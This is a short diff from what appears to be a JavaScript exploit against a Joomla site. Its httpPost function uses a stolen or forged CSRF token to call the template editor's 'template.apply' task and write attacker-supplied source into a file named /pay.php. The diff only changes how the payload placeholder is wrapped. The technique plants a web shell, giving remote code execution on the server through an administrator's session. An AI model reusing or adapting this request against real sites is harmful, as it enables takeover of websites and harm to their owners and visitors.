@@ -23,7 +23,7 @@ function httpPost(theUrl, csrftoken)
     }
     else
     {
-        xmlHttp.send("jform[source]=<?php %s ?>&task=template.apply&" + csrftoken + "=1&jform[extension_id]=507&jform[filename]=/pay.php");
+        xmlHttp.send("jform[source]=%s&task=template.apply&" + csrftoken + "=1&jform[extension_id]=507&jform[filename]=/pay.php");
     }
     return xmlHttp.responseText;
 
